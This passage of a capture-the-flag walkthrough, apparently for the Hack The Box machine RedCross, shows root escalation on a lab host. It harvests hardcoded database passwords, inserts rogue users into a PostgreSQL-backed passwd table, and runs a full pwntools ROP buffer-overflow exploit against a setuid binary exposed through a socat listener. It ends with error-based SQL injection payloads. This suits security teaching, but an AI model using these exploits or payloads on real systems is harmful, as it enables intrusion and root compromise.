#### Postgresql

Postgres is a bit different if you are used to mysql or mssql. [This link](https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546) is a great cheat sheet of commands to use (it took me a while to find `\q` to exit).

Since I can see the php code adding users to this database, this must be where access for these temporary users is controlled, as opposed to the typical `/etc/passwd` and `/etc/shadow`.

There are multiple sets of creds for the db in this site code:

```

www-data@redcross:~/html$ grep -r pg_connect .
./admin/pages/firewall.php:     $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
./admin/pages/users.php:        $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
./admin/pages/actions.php:      $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
./admin/pages/actions.php:      $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
./admin/pages/actions.php:      $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
./admin/pages/actions.php:      $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");

```

I’m interested in unixusrmgr because it can add users. I can connect like this:

```

www-data@redcross:/$ psql -h 127.0.0.1 -U unixusrmgr -p 5432 -d unix
Password for user unixusrmgr: 
psql (9.6.7)
SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
Type "help" for help.

unix=>

```

The `passwd_table` has the following structure:

```

unix=> select * from passwd_table;
 username  |               passwd               | uid  | gid  | gecos |    homedir     |   shell
-----------+------------------------------------+------+------+-------+----------------+-----------
 tricia    | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
(1 row)

```

Additionally, different users for the database can add different parts. For example, unixusrmgr can add users (as seen in the php code and I’ll show more times below), but can’t set the user id:

```

unix=> insert into passwd_table (username, passwd, uid, gid, homedir) values ('ro0xdft', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 0, 0, '/root');
ERROR:  permission denied for relation passwd_table

```

#### Add User penel0xdf

I’ll add a user with group id that matches penelope, following the model from `actions.php`. I remember the group id is 1000 from `/etc/passwd`:

```

www-data@redcross:/var/www/html/admin/pages$ grep penelope /etc/passwd
penelope:x:1000:1000:Penelope,,,:/home/penelope:/bin/bash

```

I’ll create a password:

```

www-data@redcross:/home/penelope$ openssl passwd -1 0xdf
$1$wV7CPbj9$59kAklYgquXe5TuJYIT591

```

Now I’ll add the user with penelope’s group:

```

unix=> insert into passwd_table (username, passwd, gid, homedir) values ('penel0xdf', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 1000, '/home/penelope');
INSERT 0 1

```

Now I can ssh in:

```

root@kali# ssh penel0xdf@10.10.10.113
penel0xdf@10.10.10.113's password: 
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

penel0xdf@redcross:~$ id
uid=2020(penel0xdf) gid=1000(penelope) groups=1000(penelope)

penel0xdf@redcross:~$ ls
haraka  user.txt

```

And I can grab `user.txt`:

```

penel0xdf@redcross:~$ cat user.txt 
ac899bd4...

```

## Shell As root

From penelope, there are three different paths to getting a shell as the root user:

![1554240903953](https://0xdfimages.gitlab.io/img/1554240903953.png)

### Path 1: sudoers Group

The method I originally used, and an unintended path was to go back into the database the same as before, and create another user, this time with the `sudoers` group, which is 27:

```

dff@redcross:~$ grep sudo /etc/group
sudo:x:27:

```

Create the user:

```

unix=> insert into passwd_table (username, passwd, gid, homedir) values ('sud0xdfer', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 27, '/home/penelope');
INSERT 0 1

```

Now ssh in:

```

root@kali# ssh sud0xdfer@10.10.10.113
sud0xdfer@10.10.10.113's password:
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sud0xdfer@redcross:~$ id
uid=2023(sud0xdfer) gid=27(sudo) groups=27(sudo)

```

And `sudo`:

```

sud0xdfer@redcross:~$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for sud0xdfer:
root@redcross:/home/penelope# id
uid=0(root) gid=0(root) groups=0(root)

```

Get `root.txt`:

```

root@redcross:~# cat root.txt 
892a1f4d...

```

### Path 2: Via unixnssroot

#### Create User With root Group

I confirmed with the box author that the intended path was as follows.

I’ll create a user just as the previous times with the root group id:

```

unix=> insert into passwd_table (username, passwd, gid, homedir) values ('ro0xdft', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 0, '/root');
INSERT 0 1

```

And ssh in:

```

root@kali# ssh ro0xdft@10.10.10.113
ro0xdft@10.10.10.113's password: 
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
ro0xdft@redcross:~$ id
uid=2024(ro0xdft) gid=0(root) groups=0(root)

```

I have the root group, but I still can’t read `root.txt`, as it’s only readable to the root user:

```

ro0xdft@redcross:~$ cat root.txt 
cat: root.txt: Permission denied

ro0xdft@redcross:~$ ls -l root.txt 
-rw------- 1 root root 33 Jun  8  2018 root.txt

```

#### Find psql Configs

The jail in use here is based on something called Name Service Switch, which allows you to store user and group information in a database. PostgreSQL has a plugin for this (here’s an [interesting blog](http://www.karoltomala.com/blog/?p=869) for more reading).

There are two configuration files the article lists that define querying information from the database and feeding it to NSS: `nss-pgsql.conf` and `nss-pgsql-root.conf`. I can see both of those on RedCross:

```

ro0xdft@redcross:/etc$ ls -l nss-pgsql*
-rw-r--r-- 1 root root 1341 Jun  8  2018 nss-pgsql.conf
-rw-rw---- 1 root root  540 Jun  8  2018 nss-pgsql-root.conf

```

While `nss-pgsql.conf` has information I was already aware of, I’ll find a new user for the database, unixnssroot, in `nss-pgsql-root.conf`:

```

ro0xdft@redcross:/etc$ cat nss-pgsql-root.conf 
shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;
shadow = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE (username,lastchange) IN (SELECT username, MAX(lastchange) FROM shadow_table GROUP BY username);

```

#### Add root User

Now I can connect to the database using the unixnssroot user and password from the config file:

```

ro0xdft@redcross:/etc$ psql -h 127.0.0.1 -U unixnssroot -p 5432 -d unix
Password for user unixnssroot: 
psql (9.6.7)
SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
Type "help" for help.

unix=>

```

This user can add a user with user id 0 (root):

```

unix=> insert into passwd_table (username, passwd, uid, gid, homedir) values ('r0xdfot', '$1$wV7CPbj9$59kAklYgquXe5TuJYIT591', 0, 0, '/root');
INSERT 0 1

```

Now I can exit `pgsql` and sudo into my new user:

```

ro0xdft@redcross:/etc$ su r0xdfot
Password: 
r0xdfot@redcross:/etc# id
uid=0(r0xdfot) gid=0(root) groups=0(root)

```

And read `root.txt`:

```

r0xdfot@redcross:~# cat root.txt 
892a1f4d...

```

### Path 3: BOF in iptctl

#### Enumeration

From my shell as www-data or penelope, I have access to the `iptctl` binary:

```

penelope@redcross:/dev/shm$ ls -l /opt/iptctl
total 16
-rwsr-sr-x 1 root root 13152 Jun 10  2018 iptctl

```

It makes sense that it’s setuid, as only root can mess with the firewall rules, and I know it’s called by the php applications which are not running as root.

#### Source Analysis

The overflow happens in the `interactive` function:

```

#define BUFFSIZE 360

void interactive(char *ip, char *action, char *name){
        char inputAddress[16];
        char inputAction[10];
        printf("Entering interactive mode\n");
        printf("Action(allow|restrict|show): ");
        fgets(inputAction,BUFFSIZE,stdin);
        fflush(stdin);
        printf("IP address: ");
        fgets(inputAddress,BUFFSIZE,stdin);
        fflush(stdin);
        inputAddress[strlen(inputAddress)-1] = 0;
        if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
                printf("Usage: %s allow|restrict|show IP\n", name);
                exit(0);
        }
        strcpy(ip, inputAddress);
        strcpy(action, inputAction);
        return;
}

```

The program uses `fgets` to read 360 bytes into both `inputAction` and `inputAddress`, despite the fact that those buffers are allocated to 10 and 16 bytes respectively. Also, `fgets` will read any data, including nulls, so that makes life much easier. I don’t have to worry about those `strcpy` calls, even if they are vulnerable too. On 64-bit, finding an exploit with no nulls could prove challenging.

I will need whatever input I give to pass either `isValidAction` and `isValidIpAddress`:

```

int isValidIpAddress(char *ipAddress)
{
        struct sockaddr_in sa;
        int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
        return result != 0;
}

int isValidAction(char *action){
        int a=0;
        char value[10];
        strncpy(value,action,9);
        if(strstr(value,"allow")) a=1;
        if(strstr(value,"restrict")) a=2;
        if(strstr(value,"show")) a=3;
        return a;
}

```

The IP check is going to be hard to spoof. The action will be easy, as long as one of the three options is present in the first 9 bytes of the string.

So I’ll overflow the action parameter.

#### Check Defenses

It looks like full ASLR is enabled on RedCross:

```

penelope@redcross:/home/penelope$ cat /proc/sys/kernel/randomize_va_space
2

```

I’ll pull a copy of the binary back to my box by making a copy in one of the web directories and then pulling it down. Then I’ll open it in `gdb`:

```

root@kali# gdb -q ./iptctl
Reading symbols from ./iptctl...(no debugging symbols found)...done.
gdb-peda$ 

```

Then I can run `checksec`:

```

gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

```

NX enabled means I can’t just drop shellcode on the stack and jump to it. But with no other protections, I can do a return oriented programming (ROP) attack.

#### Find Offset

Because I run `gdb` with [peda](https://github.com/longld/peda), I have access to `pattern_create`:

```

gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'

```

Now I’ll start the program with the `-i` for interactive. When prompted for action, I’ll enter “allow” and the pattern. I need the allow to pass the valid action check. Then, I’ll enter a dummy IP for IP:

```

gdb-peda$ run -i
Starting program: /media/sf_CTFs/hackthebox/redcross-10.10.10.113/iptctl -i
Entering interactive mode
Action(allow|restrict|show): allowAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
IP address: 1.1.1.1

```

On hitting enter, I’m taken to:

```

Program received signal SIGSEGV, Segmentation fault.

```

The status looks like:

```

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffdf9a ("allowAAA%A1.1.1.1")
RBX: 0x0
RCX: 0x7ffff7e70031 (<__strcasecmp_l_sse2+2881>:        test   DWORD PTR [rdi+0x66000016],ecx)
RDX: 0x11
RSI: 0x7fffffffde26 ("allowAAA%A1.1.1.1")
RDI: 0x7fffffffdf9a ("allowAAA%A1.1.1.1")
RBP: 0x414441412841412d ('-AA(AADA')
RSP: 0x7fffffffde48 ("A;AA)AAEAAaAA0AAFAAbA\n")   <--
RIP: 0x400b5e (<interactive+271>:       ret)
R8 : 0x7fffffffdd57 --> 0x0
R9 : 0x1
R10: 0xfffffffffffff482
R11: 0x7ffff7f58a60 --> 0xfff20cc0fff20cb0
R12: 0x4007b0 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe090 --> 0x2
R14: 0x0
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400b57 <interactive+264>:  call   0x4006f0 <strcpy@plt>
   0x400b5c <interactive+269>:  nop
   0x400b5d <interactive+270>:  leave  
=> 0x400b5e <interactive+271>:  ret    
   0x400b5f <main>:     push   rbp
   0x400b60 <main+1>:   mov    rbp,rsp
   0x400b63 <main+4>:   sub    rsp,0x160
   0x400b6a <main+11>:  mov    DWORD PTR [rbp-0x154],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde48 ("A;AA)AAEAAaAA0AAFAAbA\n")   <--
0008| 0x7fffffffde50 ("AAaAA0AAFAAbA\n")
0016| 0x7fffffffde58 --> 0xa4162414146 ('FAAbA\n')
0024| 0x7fffffffde60 --> 0x7fffffffdfd0 --> 0x200040000
0032| 0x7fffffffde68 --> 0x7ffff7ffe730 --> 0x7ffff7fd3000 (jg     0x7ffff7fd3047)
0040| 0x7fffffffde70 --> 0x0
0048| 0x7fffffffde78 --> 0x7ffff7fdf3af (<_dl_lookup_symbol_x+335>:     add    rsp,0x30)
0056| 0x7fffffffde80 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400b5e in interactive ()

```

In 64-bit, the bad address won’t actually load into RIP, but I can find the offset at the top of the stack, at RSP. I’ve marked it in the output above with `<--`

Now I’ll get the offset:

```

gdb-peda$ pattern_offset A;AA
A;AA found at offset: 29

```

Note, that is 29 beyond the “allow” I started my input with.

I can run again and give “allowAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB” as input, and see that it crashes trying to pop BBBBBBBB into RIP.

#### Payload Strategy

Now I just need a payload to run with my control over RIP. Were this a 32-bit host, a simple ret2libc would be the obvious choice, as I’ve recently shown in [Frolic](/2019/03/23/htb-frolic.html#privesc-www-data--root) and [October](/2019/03/26/htb-october.html#privesc-to-root). I’ll take a similar strategy here, but there’s two things I’ll need to do differently for a 64-bit host.

First, in x64 parameters are passed to a function differently. In x86, arguments are passed on that stack, so I could over write the return pointer with the function I wanted to call, then the next word was the exit address (or junk), and then the next word(s) were the arguments to pass. In x64, the arguments are passed in registers. So to call `system("sh")`, I need to get the address of the string “sh” into the RDI register.

Second, ASLR uses a much larger address space in x64:

```

penelope@redcross:/home/penelope$ ldd /opt/iptctl/iptctl | grep libc
ldd /opt/iptctl/iptctl | grep libc
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f832410e000)
penelope@redcross:/home/penelope$ ldd /opt/iptctl/iptctl | grep libc
ldd /opt/iptctl/iptctl | grep libc
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f96ddd9f000)
penelope@redcross:/home/penelope$ ldd /opt/iptctl/iptctl | grep libc
ldd /opt/iptctl/iptctl | grep libc
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f81ef037000)
penelope@redcross:/home/penelope$ ldd /opt/iptctl/iptctl | grep libc
ldd /opt/iptctl/iptctl | grep libc
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fea7918b000)
penelope@redcross:/home/penelope$ ldd /opt/iptctl/iptctl | grep libc
ldd /opt/iptctl/iptctl | grep libc
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd7999c1000)
penelope@redcross:/home/penelope$ ldd /opt/iptctl/iptctl | grep libc
ldd /opt/iptctl/iptctl | grep libc
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7a548e8000)
penelope@redcross:/home/penelope$ ldd /opt/iptctl/iptctl | grep libc
ldd /opt/iptctl/iptctl | grep libc
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3048358000)

```

Looking at those results, I see 28 bits of range (7 4-bit hex characters). So where as before the math on 1000 attempts was 1 - (511/512)1000 = 85.84%, in this case instead of 29 I have 228, so 1 - (268435455/268435456)1000 = 0.000372528%. If I up it to a million attempts, my odds of success jump to 0.40%.

Fortunately for me, the program makes a call to `execvp` to call `iptables`, which means there’s an entry for it in the PLT, which does not change with ASLR. `execvp` is called as `int execvp(const char *file, char *const argv[]);` according to the [man page](https://linux.die.net/man/3/execvp). So that just means I need to get “sh” into RDI and a null word into RSI (for no arguments).

#### ROP

I’m going to work with what are known as ROP gadgets - Little snips of code at addresses that aren’t changing that will do some work for me and then return. For simple gadgets, I can just type `rop` in `gdb`/`peda`, and it will return a list:

```

gdb-peda$ rop
Gadgets information                                                  
============================================================
0x00000000004007d9 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x0000000000400d58 : add al, ch ; ret 0xfff9
0x00000000004007df : add bl, dh ; ret
...[snip]...
0x0000000000400de3 : pop rdi ; ret
0x0000000000400de1 : pop rsi ; pop r15 ; ret
...[snip]...
Unique gadgets found: 93

```

I’ve truncated must of the output, but scrolling through these two in the middle jumped out as useful to me. The first will pop the top value on the stack (something I control) into RDI and then return. The second will pop into RSI, then pop into R15, and then return. As long as I don’t mind messing up R15 (which I don’t), this works.

I’ll make a payload that looks like this:

```

"allow" + "A"*29 + pop_rdi + sh_string + pop_rsi_r15 + null + anything + execvp_addr

```

When the function returns, it will go to the top value on the stack, my `pop_rdi` gadget. Now the top of the stack will be the address of the “sh” string. So as the pop\_rsi gadget runs, it will pop that address into RDI and return. When it returns, the address of the second gadget is atop the stack. Return is executed, going to that gadget, and leaving `value_for_rsi` at the top. After two pops, two more values I provide put into RSI and R15, and the address of `execvp` is on top of the stack when another return is reached. Now it runs and gives me a shell.

I’ll add a couple more gadgets in there in actuality to run `setuid` before running `execve`, but that illustrates the idea.

#### Payload

I just need the values for the registers. First, I want the string “sh” in rdi. Luckily, it exists inside the main binary, where the address will be static:

```

gdb-peda$ find "sh"                       
Searching for 'sh' in: None ranges                                             
Found 110 results, display max 110 items:                                       
    iptctl : 0x40046e --> 0x7063727473006873 ('sh')
    iptctl : 0x400e17 --> 0x62732f00776f6873 ('show')
    iptctl : 0x400e78 --> 0x203a29776f6873 ('show): ')
    iptctl : 0x400ea9 ("show IP\n")                    
    iptctl : 0x400ed1 ("show IP_ADDR\n")

```

That top one is perfect. It’s actually the end of the string “fflush”, but that’s ok:

```

gdb-peda$ x/s 0x40046e                                                                   
0x40046e:       "sh"                                                                                   
gdb-peda$ x/s 0x40046a                                                          
0x40046a:       "fflush"

```

I can get the PLT address of `execvp` by starting `gdb` fresh and printing the function:

```

gdb-peda$ p execvp
$1 = {<text variable, no debug info>} 0x400760 <execvp@plt>

```

If I let the debugger run, after the function is called, the inner workings get updated such that that same command will show the libc address:

```

gdb-peda$ p execvp
$1 = {int (const char *, char * const *)} 0x7ffff7ea3240 <__GI_execvp>

```

But the libc address changes with ASLR, so I want the first one.

I can see all the plt functions that I’ll have access to in gdbi by opening `gdb` and running `plt`:

```

gdb-peda$ plt
Breakpoint 1 at 0x400760 (execvp@plt)
Breakpoint 2 at 0x400770 (exit@plt)
Breakpoint 3 at 0x400750 (fflush@plt)
Breakpoint 4 at 0x400730 (fgets@plt)
Breakpoint 5 at 0x400790 (fork@plt)
Breakpoint 6 at 0x400740 (inet_pton@plt)
Breakpoint 7 at 0x400720 (printf@plt)
Breakpoint 8 at 0x400700 (puts@plt)
Breakpoint 9 at 0x400780 (setuid@plt)
Breakpoint 10 at 0x4006f0 (strcpy@plt)
Breakpoint 11 at 0x400710 (strlen@plt)
Breakpoint 12 at 0x4006e0 (strncpy@plt)
Breakpoint 13 at 0x4007a0 (strstr@plt)

```

I’ll make use of `setuid` as well.

#### Interaction

It can sometimes be a pain to interact with a binary like `iptctl` that is sending prompts and looking for input on stdin. I could use `pwntools`, but that won’t be installed on the target system. But socat is on the target system. So I’ll use `socat` to listen on a socket and have that interact with the program. Then, I can connect from my host and use `pwntools` to get a shell.

`socat` [takes two multidirectional byte streams and connects them](https://linux.die.net/man/1/socat). The two parameters are the two streams, like this:

```

socat TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i"

```

This defines the first stream as listening on TCP 9001. The second stream is the program running in interactive mode.

Now I can set the target of my exploit to 10.10.10.113:9001, and run it.

#### Exploit

All of that adds up to:

```

  1 #!/usr/bin/env python
  2 # on redcross setup iptctl with socat listening on 9001
  3 # socat TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i"
  4 
  5 from pwn import *
  6 
  7 
  8 # addresses
  9 execvp  = p64(0x400760) # execve plt
 10 setuid  = p64(0x400780) # setuid plt
 11 pop_rdi = p64(0x400de3) # pop rdi; ret
 12 pop_rsi = p64(0x400de1) # pop rsi; pop r15; retd
 13 sh_str  = p64(0x40046e) # "sh"
 14 
 15 #setup payload
 16 payload = "allow" +("A"*29)
 17 
 18 # setuid(0)
 19 payload += pop_rdi
 20 payload += p64(0)
 21 payload += setuid
 22 
 23 # execvp("sh", 0)
 24 payload += pop_rdi
 25 payload += sh_str
 26 payload += pop_rsi
 27 payload += p64(0)
 28 payload += p64(0)
 29 payload += execvp
 30 
 31 payload += "\n7.8.8.9\n"
 32 
 33 log.info("Attempting to connect")
 34 try:
 35     p = remote("10.10.10.113",9001)
 36 except pwnlib.exception.PwnlibException:
 37     log.warn("Could not connect to target")
 38     log.warn('Is socat running on target?')
 39     log.warn('TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i" running?')
 40     exit()
 41 p.sendline(payload)
 42 p.interactive()

```

If I run without starting `socat`, it warns me:

```

root@kali# python ./pwn_iptctl.py
[*] Attempting to connect
[-] Opening connection to 10.10.10.113 on port 9001: Failed
[ERROR] Could not connect to 10.10.10.113 on port 9001
[!] Could not connect to target
[!] Is socat running on target?
[!] TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i" running?

```

Start `socat`:

```

penelope@redcross:/dev/shm$ socat TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i"

```

And exploit to get shell with effective userid of root:

```

root@kali# python pwn_iptctl.py
[*] Attempting to connect
[+] Opening connection to 10.10.10.113 on port 9001: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=1000(penelope) egid=0(root) groups=0(root)

```

## Beyond Root

### SQLi Details

I noticed when I added a `'` to the `o` parameter in the url that I got a debug statement back from the page:

![](https://0xdfimages.gitlab.io/img/1554221201416.png)

When I ran `sqlmap`, it offered this as one of the proof of concepts to get data:

```

    Type: error-based                                                        
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: o=9') AND (SELECT 8387 FROM(SELECT COUNT(*),CONCAT(0x7176717671,(SELECT (ELT(8387=8387,1))),0x7170786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vfSo&page=app

```

This statement is going to create an error condition because of how `GROUP BY` requires unique values. [This video](https://www.youtube.com/watch?v=2UUWowboSfA) walks through that in more detail, and here’s [another post describing this kind of error](https://hydrasky.com/network-security/error-based-sql-injection-attack/).

NETSPI has a [list of error based injections](https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql) that gives a simplified version of that query:

```

SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT username FROM USERS LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)

```

If I visit `https://intra.redcross.htb/?o=1') and (select 1 from (Select count(*),Concat((version()),0x3a,floor(rand (0) *2))y from information_schema.tables group by y) x)-- -&page=app`, I get the db version back:

![1555090092657](https://0xdfimages.gitlab.io/img/1555090092657.png)

Note, the “:1” at the end is not part of the version, but rather the result of the `concat` in the injection and the rand that causes the error.

The NETSPI list has a simpler version that uses XML Parse Errors. Their example is:

```

SELECT extractvalue(rand(),concat(0x3a,(select version())))

```

Playing around with that a bit to get it to work, I can get a version out of the page by going to:

`https://intra.redcross.htb/?page=app&o=1' and extractvalue(0x0a,concat(0x0a,(version()))) and 1)'`:

![1555090646456](https://0xdfimages.gitlab.io/img/1555090646456.png)

### Jail Config

I’ll notice that the php code uses the following query to the database to create a user:

```

"insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')"

```

The group is set to 1001, and the homedir is set to `/var/jail/home`.

When I ssh in as one of these users, I can see group 1001 is associates:

```

$ id
uid=2025 gid=1001(associates) groups=1001(associates)

```

However, if I try to `cd ~`, it returns an error:

```

$ cd ~
-bash: cd: /var/jail/home: No such file or directory

```

If I use my root shell to look at the `/etc/ssh/sshd_config` file, I’ll see what’s going on:

```

r0xdfot@redcross:/# grep -v "^#" /etc/ssh/sshd_config | grep .
PermitRootLogin prohibit-password
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
Match group associates
          ChrootDirectory /var/jail/
          X11Forwarding no
          AllowTcpForwarding no

```

At the bottom, it says that for any user in the associates group, change the root directory to `/var/jail`. So when I connect as this new account, my `/` is actually the system’s `/var/jail`, so `/var/jail/home` to me would be `/var/jail/var/jail/home` to the system, which doesn’t exist.

That is a neat way to keep users to a limited directory space.

I can also fix this in the php code. If I change the homedir in the query above to just `/home`, then create a user, now the homedir works as I suspect the author intended:

```

$ id
uid=2026 gid=1001(associates) groups=1001(associates)
$ cd ~
$ pwd
/home

```

line